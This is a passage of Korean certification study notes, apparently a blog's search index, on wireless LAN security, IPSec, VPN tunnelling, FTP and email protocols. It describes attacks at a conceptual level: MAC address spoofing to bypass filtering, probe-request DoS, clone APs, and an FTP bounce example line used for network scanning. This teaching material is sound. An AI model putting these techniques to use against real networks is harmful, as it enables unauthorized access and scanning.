기업(엔터프라이즈) &gt; Radius 인증                            EAP / Radius : Radius 인증서버               TKIP 암호화 (WPA-1) : WEP(802.11) 의 문제점 보완                                                   802.11n (2009) : 주파수 대역 2.4 ~ 5GHz, 속도 70~250MBps            MIMO 안테나, 수신장비를 통한 성능 향상 목적           무선랜 환경     상용 무선랜 환경            이동통신사가 고객 서비스용으로 구축       USIM 이나 MAC, ID/PW 로 사용           공중 무선랜 환경            공공기관, 호텔, 까페 등에서 불특정 다수에게 서비스       보안상 취약           사설 무선랜 환경            일반공유기를 통해 사용           기업 무선랜 환경            기업 내부 업무용으로 구축           무선랜 네트워크 (WLAN) 유형 (802.11)     장비 설명            단말기       무선 AP                    유선랜 말단에 연결           무선 네트워크 관련 여러 설정값을 가지고 있음           무선표준에 따라 서비스 범위가 다름                       무선 브릿지                    2개 이상의 무선 랜을 연결하는 장비                       무선랜카드                    무선통신을 위해 전파를 송수신하는 장비           단말기, AP 장비에 장착                       무선랜안테나                    무선전파를 멀리 송수신하기 위한 장비           지향성 / 무지향성 : 방향의 유무                       사용자 인증서버                    무선랜 사용자의 인증을 위한 장비           인증키 관리                           infrastructure 모드 (Client / Server)            무선 AP와 단말기 간 통신                    단말기간 직접 통신이 불가, 무선 AP 를 경유 통신                       1개 이상의 무선 AP로 구성                    무선 AP 는 기업용 백본이나 초고속 인터넷 라인에 연결           BSS(Base Service Sets) : 무선 AP 와 무선단말기의 최소 규모 무선랜           DS(Distribution System) : 여러 개의 BSS를 포함           ESS(Extended Service Set) : 802.11 표준에서는 다수의 BSS 를 갖는 네트워크를 일컬음                           Ad-hoc 모드 (Peer to Peer)            AP 없이 단말기 간 통신       보안 취약                    암호화의 신뢰성 구축 필요                            많은 단말기들을 그룹화               그룹 별 대표 노드 설정 (서버노드 역할)                                    그룹의 대표로 공개키를 교환                                                                               성능 제한, 전원 제한       라우팅 문제                    단말의 이동, 성능과 전원 제한 : Reactive Route (반응경로) 사용                           무선랜 보안 취약점     무선인터넷 서비스의 취약점            WEP (Wired Equivalent Privacy) : 802.11 에서 없었고, 802.11b 에서 추가                    인증과정           무선전송데이터의 암호화           최근에는 사용하지 않음                       공격방법                    AP DoS           불법 AP (정보유출)                           물리적 보안 취약점 (무선장비)            무선 AP : 외부에 노출되어 있음                    문제점                            도난, 파손               리셋에 의한 구성 설정 초기화               전원차단               LAN 차단 (내부네트워크 케이블 절체)                                   해결책                            비인가자 접근금지                                               무선단말기 : 노트북, 스마트폰 등                    해결책                            로그인 등의 락, 비인가자 접근금지                                                   기술적인 취약점            도청 가능성이 높음                    문제점                            전파 이용 : 공기를 전송매체로 사용 (브로드캐스트)               AP 에서 전송하는 전파를 도청               무선랜 분석 S/W 를 이용해 정보 획득 (Net Stumbler)               SSID : Service Set Identifier &gt; 무선랜 구분 식별자                                    무선랜 목록에 뜨는 이름과 비슷                                               암호화 방식               속도                                   해결책                            전송시 암호화                                               서비스거부 (DoS)                    문제점                            무선 AP에 대량의 무선 패킷을 전송                                    강한 방해전파를 송신에 통신에 문제를 일으킴                   클라이언트는 SSID 를 이용 Probe Request 를 무선 AP에 전송                   무선 AP는 클라이언트에 Probe Response 전송                   Attacker 는 대량으로 Probe Request 를 전송                   무선 AP는 Attacker 에게 Probe Response를 전송 (부하)                                                                   해결책                            별도의 유선 LAN 을 마련                                               불법 AP (Rogue AP)                    문제점                            설치 유무를 탐지하는 것은 어렵지 않으나, 장소를 특정하기 어려움                                   해결책                            설치가 되지 않도록 함                                               무선암호화                    WEP                            64 bit key 이용                                    MAC Frame (비밀 공유키) 40 bit                   IV (Initialization Vector) 24bit                                               RC4 알고리즘 (64 bit key)                                    취약점이 많은 알고리즘 : 거의 사용하지 않음                                               동일한 패스워드 문장으로 4개의 공유키를 생성하여 그중 1개를 택               선택된 공유키, 키 ID, Value 값을 평문으로 상대에게 알려줌               IV 길이 24 비트의 길이가 너무 짧기 때문에 재사용이 될 수 있음               키 길이 (64 bit) 가 너무 짧음ㄱ                                   WPA/WPA2 (WEP 보다 안전)                            Preshared Key : PSK                                    인증서버가 설치되어 있지 않은 소규모 망에서 사용                   인증단계에서 사용 (4Way-Handshaking)                   PSK 값을 전송패킷의 수집을 통해 추측가능 취약점                   알아내기 어려움                   해결책                                            긴 길이의 비밀키 설정                       추가적으로 인증서버 사용 권장                                                                                       802.1x / EAP                                               비인가 접근 (SSID 노출)                    무선랜은 기본적으로 개방형 인증방식을 사용 &gt; 별도 인증절차 없음           브로드캐스팅 된 SSID 의 노출로 비인가 접근이 가능           공격자는 공격에 사용되는 기본적 정보를 획득 가능                       비인가 접근 (MAC 주소 노출)                    무선랜 환경에서는 접근제어를 위해 MAC 주소를 필터링함                            무선랜카드의 MAC 주소를 이용해 무선랜 서비스 접속을 제한                                   공격자는 정상사용자의 MAC 주소를 도용 &gt; MAC 주소 필터링 무력화           예:                            Attacker : AA-BB-CC-01-02-03               AP : MAC 정보를 DB와 하여 관리               정상건 :                                                                                Attacker : 접속 요청                                                                                                       AP : MAC 확인                                                                                                       AP : 접속제한                                                                                       비인가 접근 : &gt; 내부 네트워크까지 접속할 수 있는 보안상 문제 발생                                                                                Attacker : 정상사용자의 MAC 정보 수집                                                                                                       Attacker : 정상사용자 MAC 도용                                                                                                       Attacker : 접속 요청                                                                                                       AP : MAC 확인                                                                                                       AP : 접속허용                                                                                                                           관리적인 취약점            무선랜 장비에 대한 관리 미흡                    문제점                            대부분 기관에서는 AP 의 개수정도만 파악하고 있음                                   해결책                            AP, 무선랜카드 장비 운영 현황, 사용자 현황 등을 파악해야 함               기본값, 초기값 재설정 필요                                               사용자 보안 의식 결여                    문제점                            사용자 보안 정책을 따르지 않음                                    보안기능 설정을 하지 않는 것                   협력업체, 외부 관계자에게 보안설정값, 암호키값 유출                                                                   해결책                            무선랜 관리자, 사용자의 보안 의식 고취                                               전파 출력에 대한 관리 부족                    문제점                            유선 네트워크 관리자가 무선 네트워크 관리를 겸하는 경우 전파 자원 관리의 미흡               무선랜 채널 설정 미흡 (주파수 간섭이 일어나지 않도록 채널 설정 필요)                                    주변 AP 와 3 채널 이상 떨어져야 전파 간섭이 일어나지 않음                                                                   해결책                            전파 출력 조정이 필요 (외부로 전파가 유출되지 않도록 함)                                                   무선랜 사용자 인증 취약성과 대응 기술      SSID 설정과 폐쇄시스템 운영            SSID 설정                    SSID : AP가 제공하는 무선랜망 구별을 위한 식별자           SSID 신호는 기본설정값 : 브로드캐스트로 제공                            무선랜 관리자가 SSID를 브로드캐스트 하지 않음 (숨김모드)                                    SSID 를 아는 사람만 접속 가능 (인가된 사용자)                   공격자는 SSID를 알아낼 수 있으나 시간/자원 소모 (분석도구 활용)                                                                   읽고 기억하기 쉬운 값(기관이름 등)으로 설정                       폐쇄시스템 운영                    폐쇄시스템 : 네트워크에 개방된 자원이 없도록 관리                            공유폴더를 네트워크에 개방 X               공유폴더를 반드시 사용해야 하는 경우 암호 설정, 사용자 설정                                               SSID 숨김 모드 + 접근제한 규칙 적용                    USER : AP 에 연결 요청 (SSID 값을 미리 알아야 함/채널 값 바꿔가며 전송)           AP : USER 에 연결요청 응답           USER : AP 에 인증 정보 전송           AP : USER 접속 허용           (USER는 단말기 IP, 서브넷 MASK, GATEWAY, DNS 설정이 되어야 함)           (USER : AP 의 DHCP 활용)                           MAC 주소 인증            MAC 주소 필터링                    무선 LAN 카드에도 MAC 주소가 존재                                       AP 에 무선 LAN 카드의 MAC 주소를 사전에 등록                                    무선단말기의 MAC 주소를 일괄 등록해주는 작업이 필요                                                                                               스위치 / 라우터에 MAC 주소 등록                                    스위치 / 라우터에 부하가 걸리는 문제가 발생                                                     경로 설정, 데이터 전송 설정에 부하                                                                                               인증 서버에 MAC 주소 등록                                    AP 에 저장하는 경우 AP의 메모리 소모                   인증서버 사용 시 MAC 주소 정보 저장 한계 극복                   각 AP마다 관리하던 MAC 주소를 한 곳에서 관리                   동적 WEP 적용 가능                   IEEE 802.1X EAP 인증기능 사용 가능                                                                               장점                    인가된 사용자만 접근           간단한 보안설정           여러 접근제어 수행 가능                       단점                    장비 관리에 노력 필요 (MAC 주소 노출 등 문제)           MAC 주소 관리 리소스 필요 (관리 어려움)                           WEP 인증 메커니즘            개요                    유선에서 제공하는 수준의 보안을 제공하기 위한 목적                            Data 암호화               사용자 인증                                               절차                    같은 공유키를 갖는 사용자를 정상적인 사용자로 인식           사용자 : AP 연결 요청 (SSID)           AP : 임의의 문장 생성 후 원본 저장           AP : 연결 요청 응답 ( + 문장 전송)           사용자 : 암호문 전송 (자신이 가진 공유키로 문장 암호화(WEP))           AP : 자신의 키로 복호화, 원본과 비교 후 연결 허용                       인증 메커니즘의 취약점                    단방향 인증방식에 대한 취약성                            Clone AP (복제 AP) 로 인한 피해                                    복제 AP 는 강력한 신호로 사용자를 속이고, 거짓 인증을 요구해 사용자 인증정보를 취득                   인증 결과에 관계없이 통신을 사용할 수 있게 해주고, 데이터를 스니핑                   AP는 사용자를 검증하나, 사용자는 AP를 검증하지 않음                                               업체나 기관에서 AP 가 정상 AP 인지 확인해야 함                                   고정된 공유키 취약점                            무선 랜을 사용하는 모든 장비가 동일 고정 키를 사용                                    키가 외부로 유출될 확률이 높음                                               협력업체 직원, 방문객, 퇴사자 등을 통해 WEP 값이 외부로 노출 될 수 있음                                    WEP 값 주기적으로 변경 필요                                            사용자 / 무선랜 장비가 많을 경우 주기적 변경에 어려움                                                                                       동적 WEP                                    무선 랜 환경에서 인증서버 적용                                            인증서버가 서로 다른 WEP 값을 배분                       시간이 지나면 사용자에게 WEP 키 값을 갱신 요청                                                           AP 가 동적 WEP (802.1X) 를 지원해야 함                   관리 패킷의 증가로 성능 저하가 있을 수 있음                   여전히 단방향 인증방식임                                                                                   EAP 인증 메커니즘 (확장 인증 프로토콜)            개요                    Extensible Authentication Protocol           초기 PPP (Point to Point Protocol) 에서 사용될 수 있도록 개발           현재 IEEE 802.1X (무선랜) 에서 사용           다양한 인증방식 에서 사용할 수 있음                            MD5, TLS, TTLS (터널 방식 TLS), PEAP …               PPP, 802.3, 802.11 …                                               동작방식                    USER : AP에 802.11 연결 요청                            EAPOL 프로토콜 : EAP over LAN - 랜을 통해 요청                                   AP : USER 에 연결 응답           USER : AP에 EAPOL-시작 메시지 전송 « 사용자 인증 방법 시작 부분           AP : USER에 EAPOL 요청메시지 + AP 식별자           USER : AP에 EAPOL 응답메시지 (사용자 명, 암호) + 식별자           AP : 인증서버에 RADIUS 접속 요청           인증서버 : AP에 RADIUS 접속 Challenge 전송           AP : USER에 EAPOL 요청메시지 + Challenge           USER : AP에 EAPOL 응답 (Hash 메시지 전송)           AP : 인증서버에 RAIDUS 접속 요청           인증서버 : USER 의 응답메시지 비교 후 AP에 접속 허용 전달           AP : USER에 EAPOL 인증 성공                       EAP 인증 방법                    EAP-MD5                            단방향 인증방식 이용               PW 기반               MD5 Challenge (MD5는 동적 WEP X)               인증 소요시간이 짧음                                   EAP-TLS (인증서 기반, 양방향 인증, 인증서 관리, PW 방식보다 보안 강력)                            AP : USER 에 연결 응답               USER : AP에 EAPOL-시작 메시지 전송 « 사용자 인증 방법 시작 부분               AP : USER에 EAPOL 요청메시지 + AP 식별자               USER : AP에 EAPOL 응답메시지 (사용자 명, 암호) + 식별자               AP : 인증서버에 RADIUS 접속 요청               (AP 는 중간에서 중계)               인증서버 : USER에 EAP 요청/TLS Start 전송               USER : 인증서버에 TLS Client Hello 전송               인증서버 : 서버 인증서정보, Server Hello 전송               USER : 서버 인증서를 토대로 서버인증, 클라이언트 인증서정보 전송               인증서버 : Challenge Cipher Spec 전송               USER : 응답메시지 전송               인증서버 : 인증성공 메시지 전송                                   EAP-TTLS (CHAP, OTP)                            인증서 개수가 줄어듬               관리 용이               사용자는 TTLS 서버로부터 부여된 인증서를 인증               최종 사용자 익명성 보장               RADIUS DATABASE 재사용               구성이 복잡                                    USER, AP, TTLS 서버, 인증서버                                               (앞 부분 생략)               TTLS서버 : USER 에 TTLS START 전송               USER : TTLS서버에 Client Hello 전송               (서버 인증정보 전송)               TTLS서버 : USER 에 암호에 관한 정보 전송               (TLS 터널에 관한 프로세스)                                    TTLS서버 : 인증서버에 Challenge 에 관한 정보 전송 (USER 가 요청함)                   인증서버 : TTLS 서버에 접속 허용 응답메시지 전송                   TTLS서버 : USER 에 접속 성공 메시지 전송                                                                   PEAP                            터널링방식               구성                                    USER, AP, PEAP서버, 인증서버                                               PEAP 서버를 이용하여 터널링을 구성하고 인증서버로 인증 (TTLS 와 유사)               구현이 어려움 (접속 지연시간 발생 가능)               관리 용이                                                   WEP 암호와 원리와 동작방식     개요            동일한 공유키를 가진 사용자끼리 메시지 전송 가능       공유키를 이용한 사용자인증 기능 제공           기본원리            AP와 무선단말기 간 공유키 사용                    송신 : 평문과 Key Stream(동일) 간 XOR 연산을 통해 암호문을 만들고 전송           수신 : 암호문과 Key Stream(동일) 을 XOR 연산을 통해 평문으로 복호화                       동일 공유키의 반복사용에 따른 보안 취약점                    PNRG(Pseudo Random Number Generator) : 키 값에 따라 발생하는 난수를 키스트림으로 이용함                           WEP (위의 방법보다 개선)            암호화과정                    공유키 대신 초기백터(IV) + WEP키를 결합           WEP PRNG(RC4) 이용하여 KEY 스트림 생성           평문 + ICV(Integrity Check Value) 과 XOR 연산                            ICV : CRC32 알고리즘으로 구성, 전송 도중 데이터 무결성 보장을 위함                                   암호문 생성           IV + 암호문 결합 -&gt; 802.11 패킷으로 구성                                                                                                            802.11 프레임 헤더                       IV                       암호문                       FCS (Frame Check Seq)                                                                                             패킷 프레임                                               무선랜으로 전송                                               복호화과정                                                                                    수신한 패킷 중 IV                   암호문 부분 추출                                                                   IV (추출) 와 공유키 결합           WEP PRNG(RC4) 이용하여 KEY 스트림 생성                                                                           암호문과 XOR 연산을 통해 평문                   ICV 값 복호화                                                                   평문을 뽑아내고, 평문을 CRC32 알고리즘을 통해 나온 값을 ICV 와 비교                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-Wireless_LAN/",
        "teaser": null
      },{
        "title": "정보보안 - IPSEC",
        "excerpt":"IPSEC(Internet Protocol Security)   보안서비스 (RFC2401 표준)     기밀성 : 대칭 암호화를 통해 기밀성 제공            AH : 암호화 X       ESP : 암호화 O           데이터 근원 인증 : 올바른 송신처로 온 것임을 보장            MAC (Message Authentication Code) 이용           비연결형 무결성 : 위조, 변조 되지 않음을 보장   재전송 공격 방지 : 일련번호(Sequence Number)를 유지하여 재전송 여부를 판단            SA (Security Assosication, 보안연관) 순서번호 유지, 검증           제한된 트래픽 흐름 기밀성 : 최초 출발지, 최종 수신지 정보에 대한 기밀성 보장 (터널모드)            터널 / 보안 게이트웨이란?                    IPSEC을 지원하는 라우터, 방화벽, VPN 장비                       종단과 보안 게이트웨이 사이 원본 IP Header 의 기밀성을 보장       보안 게이트 사이의 New IP Header 구간은 트래픽 흐름이 노출됨           접근 제어 : 중요한 정보 시스템에 대한 접근을 제어            SP (Security Policy, 보안정책)       IP 패킷의 허용(Bypass) / 폐기(Discard) / 보호(Protect)           IPSEC Architecture     개요            양 종단 간의 안전한 통신을 지원하기 위함       IP 계층을 기반       개방 구조의 프레임워크       IP의 취약점을 보완하기 위한 보안 기능을 제공           주요 구성 요소            프로토콜                    인증 프로토콜(AH - Authentication Header)           암호화 프로토콜(ESP - Encapsulation Security Payload)                       데이터베이스                    보안 연계 데이터베이스 (SAD)           보안 정책 데이터베이스 (SPD)                       키 관리 매커니즘 (IKE : Internet Key Exchange Protocol)           IPSEC 의 동작 모드     전송모드            원본 IP Header + IPSEC Header + 원본 IP Payload + IPSEC Tailor                    보호대상 : IP Payload (캡슐화)           보호구간 (Secure Channel) : End to End                           터널모드            New IP Header + IPSEC Hader + 원본 IP Header + 원본 IP Payload + IPSEC Tailor                    보호대상 : IP Hader + IP Payload (캡슐화)           IP 패킷 전체를 보호 &gt; 네트워크상에서 전송을 위한 New IP Header 필요           원본 출발지와 목적지의 트래픽 기밀성을 보장                           4 가지 형태의 보안성을 제공            터널 모드 AH       전송 모드 AH       터널 모드 ESP       전송 모드 ESP           IPSEC 프로토콜  인증 헤더(Authentication Header)     개요            인증 헤더는 IP 데이터그램을 인증하기 위해 필요한 정보를 포함       데이터의 인증과 무결성을 보장                    데이터의 무결성                            MAC(Message Authentication Code) 에 의해 계산된 각 필드의 합산 값을 수신자가 확인                                   데이터의 인증                            인증시 필요한 키와 인증 알고리즘을 SA 와 연계하여 지정하고 지정된 알고리즘을 수행                                   리플레이 방지                            인증 헤더에 있는 Sequence Number 필드의 값을 일련 번호화 함으로써 보장                                                   프로토콜                                                            IP Header               AH               IP Payload                                               AH 프로토콜 =&gt; 인증 (MAC 무결성, 송신처 인증)                    Security Parameter Index(32) : SA 식별자 (보안과 연관)           Sequence Number(32) : 재전송 공격 방지           Authentication Data : Mutable 필드를 제외한 IP Packet 전체에 대한 MAC값 (Integrity Check Value)                            Mutable 필드 : TTL, Header Checksum, NAT 의 SrcIP                                                   AH 프로토콜 동작모드            전송모드 (Transport) : Mutable 필드 제외한 IP Packet 전체 인증                                                                                    IP Header                   Authentication Header                   IP Payload                                                                               터널모드 (Tunnel) : Mutable 필드 제외한 New IP 패킷 전체를 인증                                                                                    New IP Header                   Authentication Header                   IP Header                   IP Payload                                                                                   ESP     개요            암호화 기법을 사용                    데이터의 무결성           리플레이 방지           비밀성                           프로토콜                                                            IP Header               ESP Header               IP Payload               ESP Tailor               ESP Auth                                               ESP 프로토콜 =&gt; 인증 (무결성, 송신처 인증), 기밀성                    IP Header 는 인증하지 않는다.           ESP Header                            Security Parameter Index(32)               Sequence Number(32)                                   ESP Tailor                            Padding : 블록암호를 위한 패딩정보               Pad Length(8)               Next Header(8) : Payload 프로토콜 타입                                   ESP Auth : 인증데이터                           ESP 프로토콜 동작모드            전송모드 (Transport)                                                                                    IP Header                   ESP Header                   IP Payload                   ESP Tailor                   ESP Auth                                                                   IP Payload ~ ESP Tailor 암호화           ESP Header ~ ESP Tailor 인증                       터널모드 (Tunnel)                                                                                    New IP Header                   ESP Header                   IP Header                   IP Payload                   ESP Tailor                   ESP Auth                                                                   IP Header ~ ESP Tailor 암호화           ESP Header ~ ESP Tailor 인증                           용어정리     보안연관 (SA, Security Association)            한 장비와 다른 장비 사이 논리적 연결을 유지하기 위한 보안설정값       단방향성 특징 (A-&gt;B SA, B-&gt;A SA)       주요항목                    SPI : 보안 연관 식별자           Sequence Number Counter : 패킷의 순서번호 카운터           Anti Replay Window : 재전송 공격 방어 window 값           AH / ESP 정보           Life time : 세션 만료 시간           Mode : IPSec 동작모드 (전송, 터널)           Path MTU : 경로의 MTU 값                           SAD            보안 연관을 모은 데이터베이스       일치 항목이 없을 경우 인터넷 키교환 (IKE)           보안정책 (SP, Security Policy)            패킷을 송/수신시 적용할 보안의 종류       Bypass, Discard, Protect (IPSec 적용) 정책           SPD            보안 정책을 모은 데이터베이스           IPSec 송신/수신 과정            Outbound 패킷(송신) -&gt; SPD 검색 -&gt; 정책 결정 -&gt; SAD 검색 -&gt; 보안설정 적용       Inbound 패킷(수신) -&gt; 패킷유형(IP, IPSec) 탐지 -&gt; 상위계층 패킷 전달                    IP 일 경우 SPD 검색하여 ByPass, Discard, Protect(패킷삭제) 룰 검색/결정           IPSec 일 경우 SAD 검색 -&gt; 일치하면 IPSec 처리 / 일치하지 않으면 패킷삭제                           IKE (Internet Key Exchange)     과정            IKE-SA 설정/생성 (1단계)       IPSec-SA 설정/생성 (2단계)           IKE 1단계 과정 - Mode 중 하나를 사용해 IKE-SA 생성            IKE-SA : IPSec-SA 생성을 위한 데이터 보호를 위함       Main Mode : 3쌍의 Message 를 교환하는 방식                    Session ID 암호화 O                       Aggressive Mode : 3개의 Message 를 교환하는 방식                    Session ID 암호화 X                           IKE 2단계 과정 - IPSec-SA 생성            IPSec-SA : 데이터 교환 시 데이터 보호를 위함           IPSec 절차 : (링크설정 -&gt; VPN 생성)(1,2단계) -&gt; Data 교환  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-IPSec/",
        "teaser": null
      },{
        "title": "정보보안 - 가상 사설망",
        "excerpt":"가상사설망(Virtual Private Network)     개요            공중 네트워크를 이용하여 전용선처럼 자신만의 고유 네트워크 효과를 누릴 수 있도록 하는 기술       데이터 전송 중 전송망에서의 침입자에 의한 데이터 왜곡, 노출을 터널링 기술(프로토콜의 한 종류)을 이용하여 방지함       터널링 : 보안성을 위함, 터널링을 통해 암호화되는 부분 : Payload           터널링            PPTP (Point to Point Tunnel Protocol)                    개발사 : MS           형성층 : Link (2계층)           최적 적용방식 : 독자적 망구성가능           PPP (Point to Point Protocol) 패킷 (2계층) 을 IP Packet 으로 캡슐화 -&gt; 3계층에서 전송           1:1 통신만 가능                       L2F (Layer 2 Forwarding)                    개발사 : 시스코           형성층 : Link (2계층)           최적 적용방식 : ISP           원격지 ISP 장비에서 접근서버로 L2F 터널을 생성           위 가상터널을 통해 세션을 생성 (PPP, RAS)           위 세션을 이용해서 원격지의 사용자가 홈사이트에서 주소를 할당하면 홈사이트 게이트웨이에서 사용자 인증을 거침           하나의 터널에 여러개 연결을 할 수 있음 : 다자간 통신이 가능           PPP 사용           Radius 와 같은 인증서버를 사용                       L2TP (Layer2 Tunneling Protocol)                    개발사 : MS 와 시스코가 함께 제안           형성층 : Link (2계층)           최적 적용방식 : ISP           L2F 에 기반, PPTP와 호환가능           지원 프로토콜 : IP, IPX, AppleTalk           WAN 기술에 지원됨                       IPSec (IP Security)                    개발사 : IETF (국제인터넷기술위원회)           형성층 : Network (3계층)           최적 적용방식 : 독자적 망구성가능           3계층 터널링 프로토콜           VPN 구현에 가장 널리 사용되는 터널링 프로토콜                            네트워크 전송 간 보안을 강화시킴               TCP/IP 통신보다 더 안전하게 IP Datagram의 보호를 수행               상위 계층에 대한 프로그램의 변경이 필요없음 (IP 계층 그대로 서비스)               암호화된 패킷이 일반 패킷과 동일한 구조 &gt; 네트워크 장비의 변경이 필요없음               라우팅을 쉽게 할 수 있음                                                   IPSEC (Internet Protocol Security)     개요            network layer에서의 보안을 위한 표준       인터넷 상에서 VPN을 구현하는데 사용될 수 있도록 IETF 에서 개발된 프로토콜셋       IPv6 에서 기본적으로 IPSec 을 지원                    IPSec 지원 방화벽, 라우터, VPN : 보안/터널 게이트웨이                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-VPN/",
        "teaser": null
      },{
        "title": "정보보안 - FTP",
        "excerpt":"FTP(File Transfer Protocol)  FTP 개요     FTP 는 2개의 연결이 필요            제어 연결 (Control Connection)                    21 번 포트 사용           명령을 전송할 때 사용 / 계속 연결 지속                       데이터 연결 (Data Connection)                    20 번 포트 사용 or 1024 번 이후 포트 사용           파일이 전송될 때 사용                           FTP 서비스의 취약점     아이디 및 패스워드가 암호화 되지 않은 채로 전송됨            root 로 FTP를 사용할 수 없게 차단           암호화된 FTP 서비스            SFTP(SSH File Transfer Protocol) : 보안 파일전송 프로토콜                    Secure Shell 이용. SSH 의 일부           SSH Client 와 SSH Server 간 보안연결 성립해야 함           22/tcp 포트 사용                       FTPS(SSL/TLS)                    990/tcp 포트 사용                           FTP 모드     Client 가 모드를 결정함.   능동모드 (Active)            FTP 의 기본 값       클라이언트에서 서버 쪽 21번 포트 (제어포트) 접속       클라이언트에서 자신의 데이터 포트, 명령어를 서버에 알려줌       서버에서 클라이언트에 접속해 명령어 처리 데이터를 전송                    클라이언트에 방화벽 (외부접속 X) 설정된 경우                            제어 포트는 연결 O               데이터 송수신 연결 X                                                   수동모드 (Passive)            클라이언트에서 서버 쪽 21번 포트 (제어포트) 접속       클라이언트에서 명령어와 자신의 데이터모드가 PASV 모드임을 서버에 알려줌       서버에서 클라이언트에 자신의 임시 데이터포트를 전송       클라이언트에서 서버의 임시 데이터포트로 접속       서버에서 클라이언트에 명령어 처리 데이터를 전송           FTP공격     FTP는 보안 이슈가 부각되기 전에 설계된 프로토콜 (취약점이 존재)            전송 내용이 평문으로 전송됨 - 비밀번호 노출                    SSL/TLS 레이어 (FTPS) 이용           SSH (SFTP) 이용                           FTP bounce attack            데이터 채널을 생성할 때 목적지를 확인하지 않는 FTP 설계 구조의 취약점 이용       active 모드에서 FTP 서버 파일 요청을 할 때 파일을 받을 포트와 IP를 전송                    get aa.txt PORT 192.168.172.10, 200                       IP와 포트를 임의의 주소로 지정                    네트워크 스캔 공격                            공격할 대상 서버 구간의 FTP 서버를 이용, 네트워크 구조 파악                                                   TFTP (Trivial FTP) attack            TFTP 는 보안이 고려되지 않음                    사용자 확인 절차 X                       일긱 전용 메모리나 디스크가 없는 워크스테이션에 설치될 수 있을 정도의 단순한 파일 송수신을 위한 프로토콜       69/udp 포트를 이용, 별도의 인증과정 없이 지정된 디렉토리에 접근 가능 (취약점)       자체 디스크가 없는 워크스테이션에 부팅이미지를 전달하기 위한 목적으로 주로 사용       사용해야 할 경우 secure mode 를 사용해야 함                    chroot 기능 이용 (지정디렉토리를 최상위 디렉토리로 설정)                            xinetd.conf or inetd.conf                                    server_args=-s [디렉터리명]                                                                                   Anonymous FTP attack            익명 FTP 서비스 : 익명계정으로 FTP 접속이 가능한 서비스                    anonymous 란 ID 를 사용, 비밀번호가 없음                       익명계정은 원격에서 인증받지 않은 어떤 사용자라도 서버의 파일에 접근 가능                    보안이슈 야기           쓰기 권한 부여 시 큰 취약점이 됨                       Anonymous FTP 서비스 제거                    redhat : vsftpd (very secure ftp daemon)                            vsftpd.conf 에서 anonymous_enable=no 로 설정                                    서비스 사용 시도시 login incorrect 출력됨                                            ftp 192.168.172.10                       user anonymous                       password                       -&gt; login incorrect                                                                                                                       디렉토리 퍼미션 관리                    Anonymous 사용자 루트 디렉토리 퍼미션 관리           bin, etc, pub 디렉터리 소유자, 퍼미션 관리                       ftp 접근제어 설정                    ftpusers 파일 이용한 접근제어 설정                            시스템관리자 (root 등) 계정의 접속 제한               ftpuser : 접속을 제한할 계정정보를 포함                                   tcp wrapper 를 이용한 접근제어                            hosts.allow / hosts.deny 파일 : IP 기반 접근제어               ftp 프로그램별 tcp wrapper 와 연동설정                                    vsftpd.conf 파일에서 tcp_wrappers=yes 설정                                                                                   ftpd 종류     proftpd : unix에서 사용, wuftp 의 대안            접속시 확인 설정                    /etc/passwd, /etc/shadow 사용자 계정 검사 (사용자 유무)           /etc/ftpusers id 존재여부 검사 (있으면 접속 거부)           /etc/shell 에 등록되지 않은 shell 사용자 접속 거부                       proftpd 설정 (proftpd.conf)                                                                                    ServerType [standalone                   inetd                   xinetd]                                                                   RootLogin [off] : 루트계정 로그인 허용 X           ServerIde [On]  : 버전정보 숨기기           MaxClients [10]  : anonymous user로 접속시 클라이언트 최대 접속 수           TimeoutIdleftp [시간] : 유휴 제한시간 지난 후 Timeout           TimeoutSession [시간] : 접속 제한시간 지난 후 Timeout           Limit Command : [MKD, CWD, RNFR, RNTD, DELE, RMD, RETR] : 명령어 제한                           vsftpd : 레드햇리눅스에서 사용, PAM 지원            주요파일                    /etc/vsftpd : 메인디렉토리           /etc/vsftpd/vsftpd.conf : 설정파일           /etc/vsftpd/ftpusers           /etc/rc.d/init.d/vsftpd : 시작, 종료 관련 스크립트 지정                       vsftpd 설정 (vsftpd.conf)                    anonymous_enable=NO           idle_session_timeout=600 (초)           listen=YES (standalone 설정여부)           max_clients=10                           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","어플리케이션"],
        "url": "https://bluesplatter.com/is_certification/IS-Application-FTP/",
        "teaser": null
      },{
        "title": "정보보안 - 이메일",
        "excerpt":"이메일 보안  이메일 구조     UA (User Agent)            메시지 구성, 메시지 읽기 / 보내기 용도의 S/W           MTA (Message Transfer Agent)            SMTP       MTA Client (User)                    UA 와 동시 호출됨           Mail Server 의 MTA Server 에 메일 저장 (SMTP)                       MTA Server                    1) MTA Client 로부터 전송받은 메일을 저장                            spool                                   2) Mail Server 내 MTA Client 에게 메일 송신                       MTA Client (Mail Server)                    연결된 상대방 MTA Server 에 메일 송신 (SMTP)                            PUSH : Client -&gt; Server                                                   MAA (Message Access Agent)            POP3, IMAP3       MAA Client                    UA 가 MAA Client 에 메일 가져올 것을 요청           Mail Server 내 MAA Server 에 메일 요청 (POP3/IMAP)           PULL : Server -&gt; Client                       MAA Server                    수신된 Mail 서버 내 Mail Box 내용 검색 (MTA 가 보관중인 메일)                           이메일 송수신 프로토콜     SMTP            MTA (Message Transfer Agent) Protocol       암호화 기능이 없음       과거 : 여러 메일서버를 거쳐서 (중계) 최종 목적지 도달       현재 : DNS 서버를 통해 메일 서버를 한 번만 거침       ESMTP (확장 SMTP) : 기존 SMTP 의 단점을 보완                    텍스트 외 영상 등 첨부           수신확인 기능                           POP3 (Post Office Protocol Ver.3)            MAA (Message Access Agent) Protocol       메일서버 MAA (POP3 / 110 TCP)       클라이언트 MAA (POP3) 에서 user/pw 정보로 메일서버에 PULL 요청                    Mail BOX 에서 해당하는 메일 PULL                           IMAP4 (Internet Mail Access Protocol Ver.4)            MAA (Message Access Agent) Protocol       메일서버 MAA (IMAP4 / 143 TCP)       POP3 보다 많은 기능을 포함                    데이터 신뢰성 보장           순서대로 송수신           이메일 수신 전에 헤더 검사           이메일 수신 전에 내용 검사           부분적으로 이메일을 수신           메일서버에서 편지함(Mail Box) 을 생성, 삭제, 이름변경                           이메일 보안기술     PEM (IETF 에서 개발) - Privacy Enhanced Mail            중앙집중화된 키 인증 방법       인터넷 표준       구현 어려움 (많이 사용되지 않음)       높은 보안성 (군사용, 금융계)       이론중심적           PGP (Phill Zimmermann 개발) - 